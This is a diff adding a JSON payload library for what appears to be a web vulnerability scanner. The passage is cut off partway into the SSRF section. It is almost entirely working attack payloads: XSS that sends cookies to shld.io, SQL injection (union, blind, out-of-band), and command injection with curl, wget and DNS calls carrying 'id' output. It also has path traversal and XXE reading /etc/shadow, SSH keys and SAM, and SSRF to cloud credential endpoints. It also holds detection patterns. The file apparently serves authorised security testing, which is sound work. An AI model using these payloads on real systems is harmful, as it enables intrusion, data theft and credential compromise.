@@ -1,0 +1,5308 @@
+{
+  "metadata": {
+    "version": "3.0.0",
+    "created": "2026-03-14",
+    "author": "Samuel - ShieldAI",
+    "description": "Payloads professionnels pour Active Analyzer - Système de marqueurs SHLD{{MARKER}}, indicateurs structurés, encodages optimisés (version intégrale v3)",
+    "total_categories": 30,
+    "total_payloads": 620
+  },
+  "injection_points": {
+    "path": {
+      "description": "Injection dans le chemin de l'URL",
+      "example": "http://site.com/PATH_HERE/page",
+      "applies_to": [
+        "DirTrav",
+        "LFI",
+        "InsecPerm",
+        "IDOR",
+        "InfoDisc",
+        "CredsExpose",
+        "SSRF"
+      ]
+    },
+    "query": {
+      "description": "Injection dans les paramètres de la query string",
+      "example": "http://site.com/page?param=VALUE_HERE",
+      "applies_to": [
+        "XSS",
+        "SQLi",
+        "CMDi",
+        "NoSQLi",
+        "LDAPi",
+        "XXE",
+        "DirTrav",
+        "SSTI",
+        "OpenRedirect",
+        "SSRF",
+        "GraphQLi",
+        "XPATHi",
+        "RateLimit",
+        "JWT"
+      ]
+    },
+    "header": {
+      "description": "Injection dans les en-têtes HTTP",
+      "example": "User-Agent: VALUE_HERE",
+      "applies_to": [
+        "CMDi",
+        "SQLi",
+        "XSS",
+        "CORS",
+        "RateLimit",
+        "SessFix",
+        "CRLF_Injection",
+        "HTTP_Request_Smuggling",
+        "InsecCrypto",
+        "JWT"
+      ]
+    },
+    "form": {
+      "description": "Injection dans les données de formulaire (POST)",
+      "example": "field_name=VALUE_HERE",
+      "applies_to": [
+        "XSS",
+        "SQLi",
+        "CMDi",
+        "CSRF",
+        "InsecUpload",
+        "NoSQLi",
+        "GraphQLi",
+        "InsecDeser",
+        "XXE",
+        "BrokenAuth",
+        "RaceCondition"
+      ]
+    },
+    "cookie": {
+      "description": "Injection dans les cookies",
+      "example": "Cookie: session=VALUE_HERE",
+      "applies_to": [
+        "SQLi",
+        "XSS",
+        "SessFix",
+        "InsecDeser",
+        "JWT"
+      ]
+    },
+    "body": {
+      "description": "Injection dans le corps de la requête (JSON, XML)",
+      "example": "{\"key\": \"VALUE_HERE\"}",
+      "applies_to": [
+        "XXE",
+        "SSRF",
+        "GraphQLi",
+        "NoSQLi",
+        "InsecDeser",
+        "Prototype_Pollution"
+      ]
+    }
+  },
+  "payloads": {
+    "XSS": {
+      "name_abbr": "XSS",
+      "name_full": "cross-site_scripting",
+      "severity": "high",
+      "cvss_base": 6.1,
+      "injection_points": [
+        "query",
+        "form",
+        "header",
+        "cookie"
+      ],
+      "payloads": [
+        {
+          "payload": "<script>document.location='https://shld.io/x?m=SHLD{{MARKER}}&c='+document.cookie</script>",
+          "encoding": "none",
+          "type": "cookie_exfil"
+        },
+        {
+          "payload": "<script>alert('XSS')</script>",
+          "encoding": "none",
+          "type": "basic_xss"
+        },
+        {
+          "payload": "<img src=x onerror=\"fetch('https://shld.io/x?m=SHLD{{MARKER}}')\" />",
+          "encoding": "none",
+          "type": "fetch_oob"
+        },
+        {
+          "payload": "<svg/onload=eval(atob('ZmV0Y2goJ2h0dHBzOi8vc2hsZC5pby94P209U0hMRCcr{{MARKER}}+')')>",
+          "encoding": "none",
+          "type": "svg_b64"
+        },
+        {
+          "payload": "<details open ontoggle=import('https://shld.io/{{MARKER}}.js')>SHLD{{MARKER}}</details>",
+          "encoding": "none",
+          "type": "dynamic_import"
+        },
+        {
+          "payload": "'-fetch('https://shld.io/?m=SHLD{{MARKER}}')//",
+          "encoding": "none",
+          "type": "js_context_break"
+        },
+        {
+          "payload": "\"><img src=1 onerror=location='https://shld.io/?c=SHLD{{MARKER}}'+document.domain>",
+          "encoding": "none",
+          "type": "attr_break_oob"
+        },
+        {
+          "payload": "<iframe srcdoc=\"<script>parent.fetch('https://shld.io/?m=SHLD{{MARKER}}')<\\/script>\">",
+          "encoding": "none",
+          "type": "srcdoc_escape"
+        },
+        {
+          "payload": "<input autofocus onfocus=\"this.src='https://shld.io/?f=SHLD{{MARKER}}'\">",
+          "encoding": "none",
+          "type": "event_autofocus"
+        },
+        {
+          "payload": "<body/onpageshow=fetch('https://shld.io/?p=SHLD{{MARKER}}')>",
+          "encoding": "none",
+          "type": "event_pageshow"
+        },
+        {
+          "payload": "<math><mi//xlink:href='data:x,<script>fetch(\"https://shld.io/?m=SHLD{{MARKER}}\")</script>'>",
+          "encoding": "none",
+          "type": "mathml_xlink"
+        },
+        {
+          "payload": "<form><button formaction=javascript:fetch('https://shld.io/?b=SHLD{{MARKER}}')>X</button></form>",
+          "encoding": "none",
+          "type": "formaction"
+        },
+        {
+          "payload": "<object type=text/html data='javascript:fetch(\"https://shld.io/?o=SHLD{{MARKER}}\")'></object>",
+          "encoding": "none",
+          "type": "object_data"
+        },
+        {
+          "payload": "javascript:/*--></title></style></textarea></script><svg/onload=fetch('https://shld.io/?js=SHLD{{MARKER}}')>",
+          "encoding": "none",
+          "type": "polyglot"
+        },
+        {
+          "payload": "'/*</script><svg onload=fetch('https://shld.io/?s=SHLD{{MARKER}}')>",
+          "encoding": "none",
+          "type": "script_break"
+        },
+        {
+          "payload": "<script>window['fetch']('https://shld.io/?w=SHLD{{MARKER}}')</script>",
+          "encoding": "none",
+          "type": "bracket_notation"
+        },
+        {
+          "payload": "<img src=x:x onerror=with(document)body.appendChild(createElement('script')).src='https://shld.io/SHLD{{MARKER}}.js'>",
+          "encoding": "none",
+          "type": "dom_create"
+        },
+        {
+          "payload": "<video><source onerror=\"navigator.sendBeacon('https://shld.io/?v=SHLD{{MARKER}}','')\">",
+          "encoding": "none",
+          "type": "beacon"
+        },
+        {
+          "payload": "<link rel=import href='data:text/html,<script>fetch(\"https://shld.io/?l=SHLD{{MARKER}}\")<\\/script>'>",
+          "encoding": "none",
+          "type": "html_import"
+        },
+        {
+          "payload": "<script>setTimeout(()=>{location='https://shld.io/?t=SHLD{{MARKER}}'},0)</script>",
+          "encoding": "none",
+          "type": "settimeout"
+        },
+        {
+          "payload": "<noscript><img src='https://shld.io/?ns=SHLD{{MARKER}}'></noscript>",
+          "encoding": "none",
+          "type": "noscript_fallback"
+        },
+        {
+          "payload": "<script>fetch('https://shld.io/?x=SHLD{{MARKER}}')</script>",
+          "encoding": "url",
+          "type": "url_encoded"
+        },
+        {
+          "payload": "<img src=x onerror=fetch('https://shld.io/?h=SHLD{{MARKER}}')>",
+          "encoding": "html",
+          "type": "html_encoded"
+        },
+        {
+          "payload": "<svg onload=fetch('https://shld.io/?b64=SHLD{{MARKER}}')>",
+          "encoding": "base64",
+          "type": "base64_encoded"
+        }
+      ],
+      "detection": {
+        "indicators": [
+          {
+            "type": "regex",
+            "value": "SHLD[A-Z0-9]{4,16}"
+          },
+          {
+            "type": "string",
+            "value": "shld.io"
+          },
+          {
+            "type": "regex",
+            "value": "<script[^>]*>[^<]*fetch\\("
+          },
+          {
+            "type": "regex",
+            "value": "onerror=fetch\\("
+          },
+          {
+            "type": "regex",
+            "value": "onload=eval\\("
+          },
+          {
+            "type": "regex",
+            "value": "<svg[^>]*/onload="
+          },
+          {
+            "type": "string",
+            "value": "document.cookie"
+          },
+          {
+            "type": "string",
+            "value": "navigator.sendBeacon"
+          },
+          {
+            "type": "regex",
+            "value": "formaction=javascript:"
+          },
+          {
+            "type": "regex",
+            "value": "srcdoc=\"<script>"
+          },
+          {
+            "type": "string",
+            "value": "dynamic_import"
+          },
+          {
+            "type": "regex",
+            "value": "xlink:href='data:x,"
+          },
+          {"type": "regex", "value": "SHLD[A-Z0-9]{4,16}"},
+          {"type": "string", "value": "shld.io"},
+          {"type": "regex", "value": "<script>alert\\("},
+          {"type": "regex", "value": "onerror=alert\\("},
+          {"type": "regex", "value": "alert\\(['\"]?.*['\"]?\\)"}
+        ],
+        "delay_based": false
+      }
+    },
+    "SQLi": {
+      "name_abbr": "SQLi",
+      "name_full": "sql_injection",
+      "severity": "critical",
+      "cvss_base": 9.8,
+      "injection_points": [
+        "query",
+        "form",
+        "header",
+        "cookie"
+      ],
+      "payloads": [
+        {
+          "payload": "' AND EXTRACTVALUE(0,CONCAT(0x7e,(SELECT CONCAT(0x534c44,0x{{MARKER}},0x3a,version()))))-- -",
+          "encoding": "none",
+          "type": "error_based_mysql"
+        },
+        {
+          "payload": "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT CONCAT(0x534c44,0x{{MARKER}},user())))-- -",
+          "encoding": "none",
+          "type": "error_based_mysql"
+        },
+        {
+          "payload": "' UNION SELECT NULL,CONCAT(0x534c44,0x{{MARKER}},0x3a,@@version),NULL-- -",
+          "encoding": "none",
+          "type": "union_based"
+        },
+        {
+          "payload": "' UNION ALL SELECT NULL,NULL,CONCAT(0x534c44,0x{{MARKER}},0x3a,database()),NULL-- -",
+          "encoding": "none",
+          "type": "union_based"
+        },
+        {
+          "payload": "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(0x534c44,0x{{MARKER}},0x3a,floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -",
+          "encoding": "none",
+          "type": "error_based_floor"
+        },
+        {
+          "payload": "1' AND IF(SUBSTR(version(),1,1)='5',SLEEP(7),0) AND 'SHLD{{MARKER}}'='SHLD{{MARKER}}",
+          "encoding": "none",
+          "type": "time_based_blind"
+        },
+        {
+          "payload": "'; WAITFOR DELAY '0:0:7'-- SHLD{{MARKER}}",
+          "encoding": "none",
+          "type": "time_based_mssql"
+        },
+        {
+          "payload": "' AND pg_sleep(7)-- SHLD{{MARKER}}",
+          "encoding": "none",
+          "type": "time_based_postgres"
+        },
+        {
+          "payload": "1 AND 1=CONVERT(int,(SELECT CONCAT(0x534c44,0x{{MARKER}},0x3a,@@version)))-- -",
+          "encoding": "none",
+          "type": "error_based_mssql"
+        },
+        {
+          "payload": "' AND 1=UTL_HTTP.REQUEST('https://shld.io/?q=SHLD{{MARKER}}')-- -",
+          "encoding": "none",
+          "type": "oob_oracle"
+        },
+        {
+          "payload": "';EXEC master..xp_dirtree '\\\\shld.io\\SHLD{{MARKER}}\\x'-- -",
+          "encoding": "none",
+          "type": "oob_mssql"
+        },
+        {
+          "payload": "' AND LOAD_FILE(CONCAT('\\\\\\\\',(SELECT CONCAT(0x534c44,0x{{MARKER}},'.shld.io\\\\a')))-- -",
+          "encoding": "none",
+          "type": "oob_mysql_dns"
+        },
+        {
+          "payload": "' OR SUBSTR((SELECT table_name FROM information_schema.tables LIMIT 1),1,1)='u' AND 'SHLD{{MARKER}}'='SHLD{{MARKER}}",
+          "encoding": "none",
+          "type": "boolean_blind"
+        },
+        {
+          "payload": "' AND (SELECT CASE WHEN (1=1) THEN 'SHLD{{MARKER}}' ELSE TO_CHAR(1/0) END FROM DUAL)-- -",
+          "encoding": "none",
+          "type": "error_based_oracle"
+        },
+        {
+          "payload": "' UNION SELECT CONCAT(0x534c44,0x{{MARKER}},0x3a,group_concat(table_name)) FROM information_schema.tables-- -",
+          "encoding": "none",
+          "type": "union_extraction"
+        },
+        {
+          "payload": "1;SELECT SLEEP(7)-- SHLD{{MARKER}}",
+          "encoding": "none",
+          "type": "stacked_time"
+        },
+        {
+          "payload": "' AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT('SHLD','{{MARKER}}',version())) USING utf8)))-- -",
+          "encoding": "none",
+          "type": "json_error_mysql"
+        },
+        {
+          "payload": "' /*!50000UNION*//*!50000SELECT*/ NULL,CONCAT(0x534c44,0x{{MARKER}},@@version),NULL-- -",
+          "encoding": "none",
+          "type": "waf_bypass_comment"
+        },
+        {
+          "payload": "' %55NION %53ELECT NULL,CONCAT(0x534c44,0x{{MARKER}},version()),NULL-- -",
+          "encoding": "none",
+          "type": "waf_bypass_hex_kw"
+        },
+        {
+          "payload": "' UNION SELECT NULL,CONCAT(0x534c44,0x{{MARKER}},@@version),NULL-- -",
+          "encoding": "url",
+          "type": "url_encoded"
+        },
+        {
+          "payload": "' AND SLEEP(7)-- SHLD{{MARKER}}",
+          "encoding": "url",
+          "type": "time_based_url_encoded"
+        },
+        {
+          "payload": "' UNION SELECT NULL,CONCAT(0x534c44,0x{{MARKER}},@@version),NULL-- -",
+          "encoding": "base64",
+          "type": "base64_encoded"
+        }
+      ],
+      "detection": {
+        "indicators": [
+          {
+            "type": "regex",
+            "value": "SHLD[A-Z0-9]{4,16}:"
+          },
+          {
+            "type": "regex",
+            "value": "You have an error in your SQL syntax.*MySQL"
+          },
+          {
+            "type": "string",
+            "value": "SQLSTATE[42000]: Syntax error"
+          },
+          {
+            "type": "regex",
+            "value": "ORA-[0-9]{5}:"
+          },
+          {
+            "type": "string",
+            "value": "PostgreSQL ERROR: syntax error"
+          },
+          {
+            "type": "string",
+            "value": "Unclosed quotation mark after the character string"
+          },
+          {
+            "type": "string",
+            "value": "Microsoft OLE DB Provider for SQL Server"
+          },
+          {
+            "type": "regex",
+            "value": "SQLite.*error"
+          },
+          {
+            "type": "string",
+            "value": "java.sql.SQLException"
+          },
+          {
+            "type": "string",
+            "value": "DB2 SQL error"
+          },
+          {
+            "type": "regex",
+            "value": "XPATH.*XPathException"
+          },
+          {
+            "type": "regex",
+            "value": "(?i)mysql_fetch_(array|row)\\(\\) expects"
+          }
+        ],
+        "delay_based": true,
+        "min_delay_seconds": 7
+      }
+    },
+    "CMDi": {
+      "name_abbr": "CMDi",
+      "name_full": "command_injection",
+      "severity": "critical",
+      "cvss_base": 9.8,
+      "injection_points": [
+        "query",
+        "form",
+        "header"
+      ],
+      "payloads": [
+        {
+          "payload": "; echo SHLD{{MARKER}}-$(id)-$(hostname)",
+          "encoding": "none",
+          "type": "unix_echo_marker"
+        },
+        {
+          "payload": "| echo SHLD{{MARKER}}-`whoami`",
+          "encoding": "none",
+          "type": "unix_pipe_marker"
+        },
+        {
+          "payload": "$(echo SHLD{{MARKER}};id;hostname)",
+          "encoding": "none",
+          "type": "subshell_marker"
+        },
+        {
+          "payload": "`printf 'SHLD{{MARKER}}'; id; uname -a`",
+          "encoding": "none",
+          "type": "backtick_marker"
+        },
+        {
+          "payload": "&& echo SHLD{{MARKER}} && cat /etc/passwd",
+          "encoding": "none",
+          "type": "unix_chained"
+        },
+        {
+          "payload": "|| echo SHLD{{MARKER}} || cat /proc/version",
+          "encoding": "none",
+          "type": "unix_or"
+        },
+        {
+          "payload": "; curl -s https://shld.io/?c=SHLD{{MARKER}}-$(id|base64)",
+          "encoding": "none",
+          "type": "oob_curl"
+        },
+        {
+          "payload": "; wget -q -O- https://shld.io/?c=SHLD{{MARKER}}-$(whoami)",
+          "encoding": "none",
+          "type": "oob_wget"
+        },
+        {
+          "payload": "; nslookup SHLD{{MARKER}}.$(hostname).shld.io",
+          "encoding": "none",
+          "type": "oob_dns"
+        },
+        {
+          "payload": "& echo SHLD{{MARKER}} & ipconfig & whoami",
+          "encoding": "none",
+          "type": "windows_basic"
+        },
+        {
+          "payload": "; ping -c 7 127.0.0.1 #SHLD{{MARKER}}",
+          "encoding": "none",
+          "type": "blind_time"
+        },
+        {
+          "payload": "| timeout 7 sh -c 'echo SHLD{{MARKER}}'",
+          "encoding": "none",
+          "type": "blind_time_alt"
+        },
+        {
+          "payload": ";ec''ho SHLD{{MARKER}};wh''oam''i",
+          "encoding": "none",
+          "type": "quote_bypass"
+        },
+        {
+          "payload": ";ec$()ho SHLD{{MARKER}};wh$()oam$()i",
+          "encoding": "none",
+          "type": "empty_var_bypass"
+        },
+        {
+          "payload": ";/bin/sh -c 'echo SHLD{{MARKER}};id'",
+          "encoding": "none",
+          "type": "explicit_shell"
+        },
+        {
+          "payload": ";bash${IFS}-c${IFS}'echo${IFS}SHLD{{MARKER}};id'",
+          "encoding": "none",
+          "type": "ifs_bypass"
+        },
+        {
+          "payload": ";{echo,SHLD{{MARKER}}};{cat,/etc/passwd}",
+          "encoding": "none",
+          "type": "brace_bypass"
+        },
+        {
+          "payload": "| powershell -c \"Write-Host SHLD{{MARKER}}; whoami\"",
+          "encoding": "none",
+          "type": "powershell"
+        },
+        {
+          "payload": "& powershell.exe -NoP -NonI -Exec Bypass -C \"Write-Output 'SHLD{{MARKER}}'\"",
+          "encoding": "none",
+          "type": "powershell_bypass"
+        },
+        {
+          "payload": "; python3 -c \"import os;print('SHLD{{MARKER}}');os.system('id')\"",
+          "encoding": "none",
+          "type": "python_exec"
+        },
+        {
+          "payload": "; echo SHLD{{MARKER}}-$(id)-$(hostname)",
+          "encoding": "url",
+          "type": "url_encoded"
+        },
+        {
+          "payload": "; echo SHLD{{MARKER}}-$(id)-$(hostname)",
+          "encoding": "base64",
+          "type": "base64_encoded"
+        }
+      ],
+      "detection": {
+        "indicators": [
+          {
+            "type": "regex",
+            "value": "SHLD[A-Z0-9]{4,16}-uid="
+          },
+          {
+            "type": "regex",
+            "value": "uid=\\d+\\([a-z_]+\\) gid=\\d+"
+          },
+          {
+            "type": "regex",
+            "value": "root:x:0:0:root:/root:/bin/(bash|sh)"
+          },
+          {
+            "type": "string",
+            "value": "shld.io"
+          },
+          {
+            "type": "regex",
+            "value": "Windows IP Configuration"
+          },
+          {
+            "type": "regex",
+            "value": "Volume Serial Number is [A-F0-9]{4}-[A-F0-9]{4}"
+          },
+          {
+            "type": "regex",
+            "value": "Linux [a-z0-9\\-\\.]+ \\d+\\.\\d+"
+          },
+          {
+            "type": "regex",
+            "value": "drwxr.xr.x"
+          },
+          {
+            "type": "regex",
+            "value": "total \\d+"
+          },
+          {
+            "type": "string",
+            "value": "/bin/bash"
+          },
+          {
+            "type": "string",
+            "value": "daemon:x:1:1:daemon"
+          },
+          {
+            "type": "regex",
+            "value": "SHLD[A-Z0-9]{4,16}\\..*\\.shld\\.io"
+          }
+        ],
+        "delay_based": true,
+        "min_delay_seconds": 7
+      }
+    },
+    "DirTrav": {
+      "name_abbr": "DirTrav",
+      "name_full": "directory_traversal",
+      "severity": "high",
+      "cvss_base": 7.5,
+      "injection_points": [
+        "path",
+        "query",
+        "form"
+      ],
+      "payloads": [
+        {
+          "payload": "../../../../../../../../etc/passwd",
+          "encoding": "none",
+          "type": "unix_deep"
+        },
+        {
+          "payload": "../../../../../../../../etc/shadow",
+          "encoding": "none",
+          "type": "unix_shadow"
+        },
+        {
+          "payload": "../../../../../../../../root/.ssh/id_rsa",
+          "encoding": "none",
+          "type": "ssh_key"
+        },
+        {
+          "payload": "../../../../../../../../root/.bash_history",
+          "encoding": "none",
+          "type": "bash_history"
+        },
+        {
+          "payload": "../../../../../../../../proc/self/environ",
+          "encoding": "none",
+          "type": "proc_environ"
+        },
+        {
+          "payload": "../../../../../../../../proc/self/cmdline",
+          "encoding": "none",
+          "type": "proc_cmdline"
+        },
+        {
+          "payload": "../../../../../../../../var/log/apache2/access.log",
+          "encoding": "none",
+          "type": "log_poisoning"
+        },
+        {
+          "payload": "../../../../../../../../var/log/nginx/error.log",
+          "encoding": "none",
+          "type": "log_nginx"
+        },
+        {
+          "payload": "..\\..\\..\\..\\..\\..\\windows\\system32\\config\\SAM",
+          "encoding": "none",
+          "type": "windows_sam"
+        },
+        {
+          "payload": "..\\..\\..\\..\\..\\..\\windows\\win.ini",
+          "encoding": "none",
+          "type": "windows_ini"
+        },
+        {
+          "payload": "..\\..\\..\\..\\..\\..\\inetpub\\wwwroot\\web.config",
+          "encoding": "none",
+          "type": "windows_webconfig"
+        },
+        {
+          "payload": "php://filter/convert.base64-encode/resource=../../../../etc/passwd",
+          "encoding": "none",
+          "type": "php_wrapper_read"
+        },
+        {
+          "payload": "php://filter/convert.base64-encode/resource=config.php",
+          "encoding": "none",
+          "type": "php_wrapper_config"
+        },
+        {
+          "payload": "php://filter/read=string.rot13/resource=index.php",
+          "encoding": "none",
+          "type": "php_wrapper_rot13"
+        },
+        {
+          "payload": "....//....//....//....//etc/passwd",
+          "encoding": "none",
+          "type": "double_slash_bypass"
+        },
+        {
+          "payload": "..././..././..././etc/passwd",
+          "encoding": "none",
+          "type": "mixed_bypass"
+        },
+        {
+          "payload": "../../../../etc/passwd%00.jpg",
+          "encoding": "none",
+          "type": "null_byte_ext"
+        },
+        {
+          "payload": "../../../../etc/passwd",
+          "encoding": "url",
+          "type": "url_encoded"
+        },
+        {
+          "payload": "..%2F..%2F..%2F..%2Fetc%2Fpasswd",
+          "encoding": "none",
+          "type": "double_url"
+        },
+        {
+          "payload": "..%252F..%252F..%252Fetc%252Fpasswd",
+          "encoding": "none",
+          "type": "double_encode"
+        },
+        {
+          "payload": "../../../../etc/passwd",
+          "encoding": "null_byte",
+          "type": "null_byte_encoded"
+        },
+        {
+          "payload": "file:///etc/passwd",
+          "encoding": "none",
+          "type": "file_protocol"
+        }
+      ],
+      "detection": {
+        "indicators": [
+          {
+            "type": "regex",
+            "value": "root:x:0:0:root:/root:/bin/(bash|sh)"
+          },
+          {
+            "type": "regex",
+            "value": "daemon:x:1:1:daemon:/usr/sbin"
+          },
+          {
+            "type": "regex",
+            "value": "nobody:x:6553[34]:"
+          },
+          {
+            "type": "regex",
+            "value": "www-data:x:3[23]:"
+          },
+          {
+            "type": "string",
+            "value": "[extensions]"
+          },
+          {
+            "type": "string",
+            "value": "for 16-bit app support"
+          },
+          {
+            "type": "string",
+            "value": "BEGIN RSA PRIVATE KEY"
+          },
+          {
+            "type": "string",
+            "value": "BEGIN OPENSSH PRIVATE KEY"
+          },
+          {
+            "type": "regex",
+            "value": "DB_PASSWORD\\s*="
+          },
+          {
+            "type": "string",
+            "value": "<?php"
+          },
+          {
+            "type": "regex",
+            "value": "\\[drivers\\]"
+          },
+          {
+            "type": "regex",
+            "value": "PATH=/usr/local/sbin"
+          }
+        ],
+        "delay_based": false
+      }
+    },
+    "XXE": {
+      "name_abbr": "XXE",
+      "name_full": "xml_external_entity",
+      "severity": "high",
+      "cvss_base": 7.5,
+      "injection_points": [
+        "form",
+        "body"
+      ],
+      "payloads": [
+        {
+          "payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>SHLD{{MARKER}}&xxe;</foo>",
+          "encoding": "none",
+          "type": "file_read_unix"
+        },
+        {
+          "payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/shadow\">]><foo>SHLD{{MARKER}}&xxe;</foo>",
+          "encoding": "none",
+          "type": "file_read_shadow"
+        },
+        {
+          "payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/hosts\">]><foo>SHLD{{MARKER}}&xxe;</foo>",
+          "encoding": "none",
+          "type": "file_read_hosts"
+        },
+        {
+          "payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///root/.ssh/id_rsa\">]><foo>SHLD{{MARKER}}&xxe;</foo>",
+          "encoding": "none",
+          "type": "file_read_ssh"
+        },
+        {
+          "payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///c:/windows/win.ini\">]><foo>SHLD{{MARKER}}&xxe;</foo>",
+          "encoding": "none",
+          "type": "file_read_windows"
+        },
+        {
+          "payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://169.254.169.254/latest/meta-data/\">]><foo>SHLD{{MARKER}}&xxe;</foo>",
+          "encoding": "none",
+          "type": "ssrf_cloud_meta"
+        },
+        {
+          "payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://100.100.100.200/latest/meta-data/\">]><foo>SHLD{{MARKER}}&xxe;</foo>",
+          "encoding": "none",
+          "type": "ssrf_alibaba_meta"
+        },
+        {
+          "payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://metadata.google.internal/computeMetadata/v1/\">]><foo>SHLD{{MARKER}}&xxe;</foo>",
+          "encoding": "none",
+          "type": "ssrf_gcp_meta"
+        },
+        {
+          "payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://shld.io/SHLD{{MARKER}}\">]><foo>&xxe;</foo>",
+          "encoding": "none",
+          "type": "oob_http"
+        },
+        {
+          "payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"file:///etc/passwd\"><!ENTITY % wrap \"<!ENTITY send SYSTEM 'https://shld.io/?d=SHLD{{MARKER}}&c=%xxe;'>\">%wrap;]><foo>&send;</foo>",
+          "encoding": "none",
+          "type": "oob_param_entity"
+        },
+        {
+          "payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"php://filter/convert.base64-encode/resource=config.php\">]><foo>SHLD{{MARKER}}&xxe;</foo>",
+          "encoding": "none",
+          "type": "php_filter_read"
+        },
+        {
+          "payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"expect://echo SHLD{{MARKER}};id\">]><foo>&xxe;</foo>",
+          "encoding": "none",
+          "type": "php_expect_rce"
+        },
+        {
+          "payload": "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///proc/self/environ\">]><foo>SHLD{{MARKER}}&xxe;</foo>",
+          "encoding": "none",
+          "type": "proc_environ"
+        },
+        {
+          "payload": "<?xml version=\"1.0\"?><!DOCTYPE lolz [<!ENTITY lol \"SHLD{{MARKER}}\"><!ENTITY lol2 \"&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;\"><!ENTITY lol3 \"&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;\">]><lolz>&lol3;</lolz>",
+          "encoding": "none",
+          "type": "billion_laughs"
+        },
+        {
+          "payload": "<?xml version=\"1.0\"?><!DOCTYPE foo SYSTEM \"https://shld.io/evil-SHLD{{MARKER}}.dtd\"><foo/>",
+          "encoding": "none",
+          "type": "external_dtd"
+        },
+        {
+          "payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"netdoc:///etc/passwd\">]><foo>SHLD{{MARKER}}&xxe;</foo>",
+          "encoding": "none",
+          "type": "netdoc_proto"
+        },
+        {
+          "payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"jar:file:///etc/passwd!/\">]><foo>SHLD{{MARKER}}&xxe;</foo>",
+          "encoding": "none",
+          "type": "jar_proto"
+        },
+        {
+          "payload": "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>SHLD{{MARKER}}&xxe;</foo>",
+          "encoding": "none",
+          "type": "encoding_variation"
+        },
+        {
+          "payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>SHLD{{MARKER}}&xxe;</foo>",
+          "encoding": "url",
+          "type": "url_encoded"
+        },
+        {
+          "payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>SHLD{{MARKER}}&xxe;</foo>",
+          "encoding": "base64",
+          "type": "base64_encoded"
+        }
+      ],
+      "detection": {
+        "indicators": [
+          {
+            "type": "regex",
+            "value": "root:x:0:0:root:/root:/bin/(bash|sh)"
+          },
+          {
+            "type": "string",
+            "value": "daemon:x:1:1:"
+          },
+          {
+            "type": "string",
+            "value": "[extensions]"
+          },
+          {
+            "type": "string",
+            "value": "for 16-bit app support"
+          },
+          {
+            "type": "regex",
+            "value": "SAXParseException"
+          },
+          {
+            "type": "regex",
+            "value": "org\\.xml\\.sax\\.SAXParseException"
+          },
+          {
+            "type": "string",
+            "value": "lxml.etree.XMLSyntaxError"
+          },
+          {
+            "type": "string",
+            "value": "ami-id"
+          },
+          {
+            "type": "string",
+            "value": "computeMetadata"
+          },
+          {
+            "type": "regex",
+            "value": "SHLD[A-Z0-9]{4,16}"
+          },
+          {
+            "type": "string",
+            "value": "shld.io"
+          },
+          {
+            "type": "regex",
+            "value": "javax\\.xml\\.parsers\\.ParserConfigurationException"
+          }
+        ],
+        "delay_based": false
+      }
+    },
+    "SSRF": {
+      "name_abbr": "SSRF",
+      "name_full": "server_side_request_forgery",
+      "severity": "high",
+      "cvss_base": 7.5,
+      "injection_points": [
+        "query",
+        "form",
+        "body",
+        "header"
+      ],
+      "payloads": [
+        {
+          "payload": "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+          "encoding": "none",
+          "type": "aws_iam_creds"
+        },
+        {
+          "payload": "http://169.254.169.254/latest/meta-data/instance-id",
+          "encoding": "none",
+          "type": "aws_instance_id"
+        },
+        {
+          "payload": "http://169.254.169.254/latest/user-data/",
+          "encoding": "none",
+          "type": "aws_user_data"
+        },
+        {
+          "payload": "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
+          "encoding": "none",
+          "type": "gcp_token"
+        },
+        {
+          "payload": "http://metadata.google.internal/computeMetadata/v1/project/project-id",
+          "encoding": "none",
+          "type": "gcp_project"
+        },
+        {
+          "payload": "http://100.100.100.200/latest/meta-data/",
+          "encoding": "none",
+          "type": "alibaba_meta"
+        },
+        {
+          "payload": "http://169.254.169.254/opc/v1/instance/",
+          "encoding": "none",
+          "type": "oracle_cloud_meta"
+        },
+        {
+          "payload": "http://127.0.0.1:6379/",
+          "encoding": "none",
+          "type": "redis_local"
+        },
+        {
+          "payload": "http://127.0.0.1:9200/_cat/indices",
+          "encoding": "none",
+          "type": "elasticsearch_local"
+        },
+        {
+          "payload": "http://127.0.0.1:8500/v1/kv/",
+          "encoding": "none",
+          "type": "consul_local"
+        },
+        {
+          "payload": "gopher://127.0.0.1:6379/_PING%0d%0a",
+          "encoding": "none",
+          "type": "gopher_redis"
+        },
+        {
